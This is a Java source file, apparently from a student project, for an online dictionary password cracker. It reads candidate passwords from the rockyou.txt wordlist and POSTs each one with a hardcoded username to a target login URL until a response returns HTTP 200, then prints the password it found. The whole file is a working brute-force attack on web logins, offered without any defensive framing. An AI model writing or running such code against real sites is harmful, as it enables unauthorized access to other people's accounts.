import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
// import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class DictionnaryOnlineCracker extends Dictionnary{

    private static final String USER_AGENT = "Mozilla/5.0";


    

    public void crack(String urlSite) {
        String username = "hamid";
        String serveur = Outils.getServeur(urlSite);
        HttpURLConnection connection = null;

        try {
            URL url = new URL(serveur);

            try (BufferedReader lecteur = new BufferedReader(new FileReader("rockyou.txt"))) {
                String ligne;
                long start = System.currentTimeMillis();
                while ((ligne = lecteur.readLine()) != null) {
                    String postParams = "username=" + username + "&password=" + ligne;

                    connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("User-Agent", USER_AGENT);
                    connection.setDoOutput(true);

                    try (OutputStream os = connection.getOutputStream()) {
                        os.write(postParams.getBytes());
                        os.flush();
                    }

                    int responseCode = connection.getResponseCode();

                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        System.out.println("\nMot de passe trouv�: " + ligne);
                        Outils.afficherTemps(System.currentTimeMillis() - start);
                        break;
                    }
                }
            }
        } catch (IOException e) {
            System.err.println("Erreur de lecture du fichier : " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    } 

    
}
